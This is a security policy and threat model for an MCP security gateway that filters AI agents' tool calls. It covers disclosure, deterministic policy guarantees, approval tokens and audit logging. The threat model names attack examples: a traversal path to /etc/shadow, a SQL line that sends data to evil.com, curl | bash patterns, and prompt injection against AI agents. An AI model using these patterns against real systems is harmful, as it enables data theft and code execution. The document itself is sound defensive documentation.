# Security Policy — MCP Security Gateway

## Vulnerability Disclosure

If you discover a security vulnerability, please report it privately to [vinayakk98@gmail.com] rather than opening a public GitHub issue. We will acknowledge receipt within 48 hours and aim to release a fix within 14 days for critical issues.

Please include:
- Description of the vulnerability
- Steps to reproduce
- Potential impact
- Suggested fix (if any)

---

## Threat Model

### What the Gateway is Designed to Defend Against

**Prompt Injection**
- Direct injection: attacker-controlled arguments containing instructions to override agent behavior
- Indirect injection: malicious content retrieved from external sources (documents, database results) that contains embedded instructions
- Comment/whitespace-based injection: hidden instructions in seemingly innocuous text

**Data Exfiltration**
- Wildcard file reads (`fs.read` with `path: /data/*`)
- Directory traversal (`../../etc/shadow`)
- SQL results exfiltrated to external URLs (`INTO OUTFILE 'http://evil.com/dump'`)
- Broad table dumps of PII

**Dangerous Command Execution**
- Shell command chaining via tool arguments
- `curl | bash` patterns
- Privilege escalation via path manipulation

**SQL Abuse**
- Mutation statements (INSERT, UPDATE, DELETE, DROP) via query tools
- UNION-based data exfiltration
- Full table dumps of sensitive data

**Unauthorized Access**
- Low-trust callers invoking high-privilege tools
- Cross-environment access (dev caller accessing prod tools)
- Expired or revoked API keys

---

## Security Properties

### Guaranteed by Design (Deterministic)

- **Hard policy denies cannot be bypassed by LLMs.** The `PolicyEngine` is a pure Python function with no LLM calls. Its DENY decision is final.
- **Raw tool arguments are never persisted.** Only the SHA-256 hash of raw arguments is stored. Sanitized (post-redaction) arguments may be stored.
- **Approval tokens are cryptographically random.** Generated with `secrets.token_urlsafe(32)` — 256 bits of entropy.
- **Approval tokens expire across Redis and Postgres.** Redis TTL is enforced for the fast path, and the Postgres fallback marks stale `PENDING` or `APPROVED` requests as `EXPIRED`.
- **Approval tokens are single-use and request-bound.** An approved token can authorize only the same caller and exact tool call it was issued for, and it is consumed into `USED` on first execution.
- **Output policy is deterministic.** Output inspection is a pure-Python policy pass that can `ALLOW`, `REDACT`, require approval for release, or `DENY` the response body after tool execution.
- **Gateway-to-server trust can be enforced with shared secrets.** The executor signs every forwarded call with an HMAC over timestamp, request id, caller id, org id, tool name, and body hash. This only becomes a real boundary if the upstream MCP server verifies those headers and rejects unsigned traffic.
- **Audit log is append-only.** No application code performs UPDATE or DELETE on `audit_events`. This is a convention enforced in `AuditLogger` — all writes go through `.write()` which only inserts.

### Best-Effort (Probabilistic)

- **LLM-based prompt injection detection.** The LLM risk classifier improves detection of novel attack patterns beyond static regex, but it is not 100% accurate. Novel techniques may evade it. The deterministic layer provides a hard floor.
- **PII redaction.** The deterministic regex-based redaction covers known PII patterns (email, SSN, credit card, AWS key format). Novel or obfuscated PII formats may not be caught.
- **Semantic argument inspection.** The ArgumentGuardAgent LLM call inspects argument semantics for hidden instructions, but adversarially crafted obfuscation may evade it.

---

## Known Limitations

| Limitation | Impact | Mitigation |
|-----------|--------|-----------|
| Sensitive output release storage | Output approvals currently persist the withheld payload in `approval_requests.output_payload` so approved releases do not re-execute the tool | Encrypt approval payloads at rest or move them to a dedicated sealed object store before calling this production-ready |
| Novel prompt injection techniques | May evade LLM detection | Deterministic patterns provide hard floor; regularly update regex heuristics |
| Policy misconfiguration | Gaps in YAML policy could allow unintended access | Default policy is deny-by-default; CI tests cover all MVP tools |
| Redis unavailability | Approval token state lost on Redis failure | Postgres serves as durable fallback; tokens stored in both |
| LLM latency | High-latency LLM calls increase gateway overhead | Per-agent timeouts enforced; heuristics short-circuit LLM calls for obvious cases |
| SQL constraint bypass | Obfuscated SQL (e.g. via stored procedures, hex encoding) may bypass keyword checks | Defense-in-depth: both LLM classifier and deterministic checks run in parallel |
| Upstream verifier not bundled | Signed gateway requests do not stop bypass traffic unless each MCP server validates them | Treat upstream verification as required deployment work, not an implicit guarantee |

---

## Approval Token Security

Approval tokens are designed with the following properties:

1. **Generation**: `secrets.token_urlsafe(32)` — cryptographically secure random, 256 bits of entropy
2. **Storage**: Redis (live state) + Postgres (durable record). The token value itself is stored — it is not a secret key (it's a lookup key). The sensitive data is the approval decision and the associated tool call.
3. **Expiry**: Configurable TTL via `APPROVAL_TOKEN_TTL_SECONDS`. Default: 3600 (1 hour). Expiry is enforced even when Redis has evicted the key and Postgres is serving as the fallback.
4. **Single-use**: Once a token is consumed for execution, its status becomes `USED` and it cannot authorize another tool call.
5. **Request binding**: Approved tokens are checked against the resolved caller identity and the exact stored tool call before execution proceeds.
6. **Admin-only approval**: Approval and denial endpoints require a short-lived admin bearer session minted from an `admin` API key stored in the same `api_keys` table as agent identities. Approval and audit reads are scoped by `org_id`, but there is still no server-side separation-of-duties check preventing the same person from submitting and approving a request.
7. **Never logged**: Approval token values are not logged in application logs.

---

## Audit Log Integrity

The audit log (`audit_events` table) is designed for forensic use:

- **No raw args**: `raw_args_hash` is SHA-256 of the original arguments. The original cannot be recovered from this.
- **Append-only**: No UPDATE or DELETE on `audit_events` is performed by any application code.
- **Complete record**: Every request (allow, deny, approval, error) produces an audit event.
- **Output review evidence**: Audit events record the output decision and the SHA-256 hash of the original tool output when execution succeeded, even if the returned payload was redacted or withheld for approval.
- **Redaction flags**: When arguments are sanitized, `redaction_flags` records what was changed and why, without storing the original sensitive value.
- **Deterministic rationale**: Every audit event records `deterministic_rationale` (from the policy engine) and optionally `llm_explanation` (from the risk classifier, when the LLM was consulted). These are kept separate so the deterministic basis for every decision is always visible.

---

## API Authentication

- `/health` and `/readyz` are unauthenticated
- The gateway endpoint (`/v1/gateway/invoke`) authenticates via `api_key` in the JSON request body — verified by bcrypt comparison against the `api_keys` table in pipeline step 2
- Admin endpoints first require `POST /v1/admin/login` with an `admin` API key from `api_keys`, then use the returned bearer session for `/v1/approvals/` and `/v1/audit/`
- Admin sessions inherit `org_id` from the authenticated key, and audit / approval queries are filtered to that org
- API key values are never logged in application logs

## Upstream Request Signing

- Forwarded MCP requests include `X-MCP-Gateway-*` headers with timestamp, request id, caller id, org id, body hash, and HMAC signature.
- The gateway signs only if `MCP_SERVER_SHARED_SECRETS[server_name]` is configured. Missing a secret is treated as a gateway error and the tool call is not forwarded.
- This repository does **not** include an upstream verifier implementation, so signed forwarding should be treated as a gateway-side contract until the MCP server enforces it.
